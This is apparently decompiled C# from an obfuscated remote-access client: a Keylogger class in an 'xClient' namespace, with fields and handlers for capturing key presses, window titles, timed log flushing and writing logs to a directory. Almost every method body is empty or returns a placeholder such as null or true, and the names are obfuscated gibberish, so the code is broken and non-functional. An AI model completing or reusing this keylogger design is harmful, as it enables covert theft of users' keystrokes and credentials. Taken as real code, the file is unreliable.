using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using dg3ypDAonQcOidMs0w;
using xClient.Core.MouseKeyHook;

namespace xClient.Core.Utilities;

public class Keylogger : IDisposable
{
	public static Keylogger Instance;

	private readonly Timer _timerFlush;

	private StringBuilder _logFileBuffer;

	private List<Keys> _pressedKeys;

	private List<char> _pressedKeyChars;

	private string _lastWindowTitle;

	private bool _ignoreSpecialKeys;

	private IKeyboardMouseEvents _mEvents;

	internal static Keylogger OlBF6PVrZgDVAKkTbyM;

	public bool IsDisposed
	{
		[CompilerGenerated]
		get
		{
			return true;
		}
		[CompilerGenerated]
		private set
		{
		}
	}

	public static string LogDirectory => null;

	public Keylogger(double flushInterval)
	{
	}

	public void Dispose()
	{
	}

	protected virtual void Dispose(bool disposing)
	{
	}

	private void Subscribe(IKeyboardMouseEvents events)
	{
	}

	private void Unsubscribe()
	{
	}

	private void OnKeyDown(object sender, KeyEventArgs e)
	{
	}

	private void OnKeyPress(object sender, KeyPressEventArgs e)
	{
	}

	private void OnKeyUp(object sender, KeyEventArgs e)
	{
	}

	private string HighlightSpecialKeys(Keys[] keys)
	{
		return null;
	}

	private void timerFlush_Elapsed(object sender, ElapsedEventArgs e)
	{
	}

	private void WriteFile()
	{
	}

	static Keylogger()
	{
		WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		WP6RZJql8gZrNhVA9v.iXLoKRSpAw();
	}

	internal static bool lmJqAIVeIWJmiqaDYTM()
	{
		return true;
	}

	internal static Keylogger Yocma7VOusotADk8B8t()
	{
		return null;
	}

	internal static object MBKmjvV0uKUxlYlTsrf(Environment.SpecialFolder specialFolder_0)
	{
		return null;
	}

	internal static void vyndSeVdpvFZAW5LL2P()
	{
	}

	internal static void ipF7j4VErmY9odeA2po()
	{
	}

	internal static object L4E8HHVhaSVIrGXhP7l()
	{
		return null;
	}

	internal static void FxIjC9VM5i7HDsrBtc2(object object_0, double double_0)
	{
	}

	internal static void sMNvKSVCMcA3F5Jj9LS(object object_0, object object_1)
	{
	}

	internal static void UWHk3pVQfoNOISLlXK2(object object_0)
	{
	}

	internal static void flNEJLVA0Gb62WAL6lr(object object_0, bool disposing)
	{
	}

	internal static void XaFEF0VynQLy2eORIo1(object object_0)
	{
	}

	internal static void PLEOQpVDaCtaU5sDLhD(object object_0)
	{
	}

	internal static void cdwls0V80DX2UK5uQXN(object object_0, object object_1)
	{
	}

	internal static void sNCGXZV9UbmSe4mpCBZ(object object_0, object object_1)
	{
	}

	internal static void vvZrOCVX7UumVUgc2Mq(object object_0, object object_1)
	{
	}

	internal static void oQ1d4KVz1Dr65LJlYw2(object object_0, object object_1)
	{
	}

	internal static void JClVKoktUqcLBY8AMOh(object object_0, object object_1)
	{
	}

	internal static void jFXJ6mkxGinG320pXCO(object object_0)
	{
	}

	internal static bool x9p2aRkcccOpU6TXpMc(object object_0, object object_1)
	{
		return true;
	}

	internal static object Ons0rGkHFwcBbNBAutk(int int_0)
	{
		return null;
	}

	internal static object onQTUYkvJDlv3K8V9j8(object object_0)
	{
		return null;
	}

	internal static object aBmJfQkPcviaSOChNYm(object object_0)
	{
		return null;
	}

	internal static object gkaT4Kk1gx4LUL8BgEy(object object_0, object object_1)
	{
		return null;
	}

	internal static Keys WrZ7YfkpF67iIYronDA(object object_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return (Keys)(object)null;
	}

	internal static bool LeVFAFkVPFqyJwFlGhh(Keys k)
	{
		return true;
	}

	internal static char rinkEkkkyraNHFfl7GY(object object_0)
	{
		return '\0';
	}

	internal static object bIiG45kYUCwJKv0PKwL(char key)
	{
		return null;
	}

	internal static bool qPjXkokFjF4YGEl8F3X(object object_0)
	{
		return true;
	}

	internal static object vvmh2NklVoU9ZWJStq8(object object_0)
	{
		return null;
	}

	internal static void DlQYnQkgXtcObubjITZ(object object_0)
	{
	}

	internal static object MoMwJ9kaVnajTeDq3Pp(object object_0, object object_1, object object_2)
	{
		return null;
	}

	internal static bool sOyrqbkjKKI2XswwqlX(object object_0, object object_1)
	{
		return true;
	}

	internal static int fE6l5wknYYrcLNYyY8J(object object_0)
	{
		return 0;
	}

	internal static bool kZZt9fk2XTescmWbVWX()
	{
		return true;
	}

	internal static object BpQvKvkwvhNTSMPt18M()
	{
		return null;
	}

	internal static DateTime gMenaGkS9eP9hcFHIp9()
	{
		return (DateTime)(object)null;
	}

	internal static bool o0A7qJkU71sLEh2d1Cw(object object_0)
	{
		return true;
	}

	internal static bool wvCItyk48WKBaHxs862(object object_0)
	{
		return true;
	}

	internal static object u4ct1Zk7nus4x6fiwst(object object_0, object object_1)
	{
		return null;
	}

	internal static void iGuiIFk5J6omXJgeHvg(object object_0, object object_1)
	{
	}

	internal static object Ja3vUckGLs2qx2YsdDY(object object_0)
	{
		return null;
	}
}
